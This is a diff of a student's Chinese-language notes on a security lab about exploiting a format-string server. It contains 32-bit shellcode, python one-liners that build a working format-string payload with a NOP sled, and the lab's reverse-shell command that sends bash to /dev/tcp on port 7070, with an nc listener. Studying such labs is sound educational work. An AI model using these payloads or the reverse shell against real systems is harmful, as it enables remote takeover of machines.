@@ -411,40 +411,40 @@ python -c 'print("\x44\xa0\x04\x08\x46\xa0\x04\x08" + "%65528x" + "%112$hn" + "%
 > 	"\x68""/bin"  # pushl "/bin"
 > 	"\x89\xe3"  # movl %esp, %ebx
 >     
->     # Push the 1st argument ’-ccc’ into stack (-ccc is equivalent to -c)
->     "\x31\xc0"  # xorl %eax,%eax
->     "\x50"  # pushl %eax
->     "\x68""-ccc"  # pushl "-ccc"
->     "\x89\xe0"  # movl %esp, %eax
+>        # Push the 1st argument ’-ccc’ into stack (-ccc is equivalent to -c)
+>     	"\x31\xc0"  # xorl %eax,%eax
+>     	"\x50"  # pushl %eax
+>     	"\x68""-ccc"  # pushl "-ccc"
+>     	"\x89\xe0"  # movl %esp, %eax
 > 
->     # Push the 2nd argument into the stack:
->     #  ’/bin/rm /tmp/myfile’
->     # Students need to use their own VM’s IP address
->     "\x31\xd2"  # xorl %edx,%edx
->     "\x52"  # pushl %edx
->     "\x68""  "  # pushl (an integer) 
->     "\x68""ile "  # pushl (an integer) ①
->     "\x68""/myf"  # pushl (an integer)
->     "\x68""/tmp"  # pushl (an integer)
->     "\x68""/rm "  # pushl (an integer)
->     "\x68""/bin"  # pushl (an integer) ②
->     "\x89\xe2"  # movl %esp,%edx
+>     	# Push the 2nd argument into the stack:
+>     	#  ’/bin/rm /tmp/myfile’
+>     	# Students need to use their own VM’s IP address
+>     	"\x31\xd2"  # xorl %edx,%edx
+>     	"\x52"  # pushl %edx
+>     	"\x68""  "  # pushl (an integer) 
+>     	"\x68""ile "  # pushl (an integer) ①
+>     	"\x68""/myf"  # pushl (an integer)
+>     	"\x68""/tmp"  # pushl (an integer)
+>     	"\x68""/rm "  # pushl (an integer)
+>     	"\x68""/bin"  # pushl (an integer) ②
+>     	"\x89\xe2"  # movl %esp,%edx
 > 
->     # Construct the argv[] array and set ecx
->     "\x31\xc9"  # xorl %ecx,%ecx
->     "\x51"  # pushl %ecx
->     "\x52"  # pushl %edx
->     "\x50"  # pushl %eax
->     "\x53"  # pushl %ebx
->     "\x89\xe1"  # movl %esp,%ecx
+>     	# Construct the argv[] array and set ecx
+>     	"\x31\xc9"  # xorl %ecx,%ecx
+>     	"\x51"  # pushl %ecx
+>     	"\x52"  # pushl %edx
+>     	"\x50"  # pushl %eax
+>     	"\x53"  # pushl %ebx
+>     	"\x89\xe1"  # movl %esp,%ecx
 > 
->     # Set edx to 0
->     "\x31\xd2"  #xorl %edx,%edx
+>     	# Set edx to 0
+>     	"\x31\xd2"  #xorl %edx,%edx
 > 
->     # Invoke the system call
->     "\x31\xc0"  # xorl %eax,%eax
->     "\xb0\x0b"  # movb $0x0b,%al
->     "\xcd\x80"  # int $0x80
+>     	# Invoke the system call
+>     	"\x31\xc0"  # xorl %eax,%eax
+>     	"\xb0\x0b"  # movb $0x0b,%al
+>     	"\xcd\x80"  # int $0x80
 > ).encode(’latin-1’)
 > ```
 > ​		您需要注意行①和②之间的代码。这就是我们将`/bin/rm`命令字符串推入堆栈的地方。在此任务中，您不需要修改此部分，但对于下一个任务，您确实需要修改它。`pushl`指令只能将32位整数推入堆栈；这就是为什么我们把字符串分成几个4字节的块。由于这是一个shell命令，添加额外的空格不会改变命令的含义；因此，如果字符串的长度不能除以四，则始终可以添加额外的空格。堆栈从高地址增长到低地址（即反向），因此我们需要将字符串也反向推入堆栈。
@@ -457,5 +457,44 @@ python -c 'print("\x44\xa0\x04\x08\x46\xa0\x04\x08" + "%65528x" + "%112$hn" + "%
 
 首先使用python生成恶意代码，存入badfile中。
 
-下面要考虑如何将恶意代码注入，比较直接的方法就是修改myprintf的返回地址，首先由程序输出可知当前myprintf的返回地址为0xbfd457b8。 
+下面要考虑如何将恶意代码注入，比较直接的方法就是修改myprintf的返回地址，首先由程序输出可知当前myprintf的返回地址为0xbfffeff8 + 4 = 0xbfffeffc 。 
 
+![image-20211013175120752](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211013175120752.png)
+
+然后恶意代码的地址就是buf数组开始地址0xbffff0e0加上前面的地址8个字节输入再加上500个字节nop。因为加了nop所以跳转的地址不用太准确，只要跳到nop上就会执行到恶意代码，这里就选了buf数组起始后的40个字节的位置即0xbffff108。
+
+```bash
+python -c 'print("\xfe\xef\xff\xbf" + "@@@@" + "\xfc\xef\xff\xbf" + "%49139x" + "%112\$hn" + "%12553x" + "%113\$hn"+ "\x90"*500 + "\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68    \x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")' > badfile
+```
+
+python -c 'print("\xfe\xef\xff\xbf" + "@@@@" + "\xfc\xef\xff\xbf"+ "%49139x" + "%112\$hn" + "%12553x" + "%113\$hn"  + "%08X."*200)' > badfile
+
+### Task 7: Getting a Reverse Shell
+
+> ​		当攻击者能够向受害者的机器注入命令时，他们对在受害者机器上运行一个简单的命令不感兴趣；他们对运行许多命令更感兴趣。攻击者想要实现的是利用攻击建立一个后门，这样他们就可以利用这个后门方便地进行进一步的破坏。
+>
+> ​		设置后门的一种典型方法是从受害机器运行Reverse shell，让攻击者能够访问受害机器。Reverse shell是一个在远程计算机上运行的shell进程，连接回攻击者的计算机。这为攻击者提供了一种方便的方法，一旦远程计算机受到威胁，就可以访问它。种子书（第二版）第9章提供了关于反向外壳如何工作的解释。它也可以在Shellshock攻击实验室和TCP攻击实验室的指南部分找到。
+>
+> ​		要获得反向shell，我们需要首先在攻击者机器上运行TCP服务器。此服务器等待我们的恶意代码从受害者服务器计算机回调。以下nc命令创建侦听端口7070的TCP服务器：
+>
+> ```bash
+> nc -l 7070 -v
+> ```
+>
+> ​		您需要修改清单3中列出的shellcode，因此外壳代码不会使用bash运行`/bin/rm`命令，而是运行以下命令。该示例假定攻击者的计算机IP地址为10.0.2.6，因此您需要更改代码中的IP地址：
+>
+> ```bash
+> /bin/bash -c "/bin/bash -i > /dev/tcp/10.0.2.6/7070 0<&1 2>&1"
+> ```
+>
+> ​		您只需要修改行①和②之间的代码，因此上面的`/bin/bash-i…`命令由shellcode执行，而不是`/bin/rm`命令。完成外壳代码后，应该构造格式字符串，并将其作为输入发送到受害者服务器。如果您的攻击成功，您的TCP服务器将获得回调，并且您将在受害者计算机上获得root shell。请在报告中提供成功的证据（包括截图）。
+
+
+
+
+
+
+
+### Task 8: Fixing the Problem
+
+> ​		还记得gcc编译器生成的警告消息吗？请解释一下它的意思。请修复服务器程序中的漏洞，然后重新编译。编译器警告消失了吗？你的攻击仍然有效吗？您只需尝试一次攻击，即可查看它是否仍然有效。
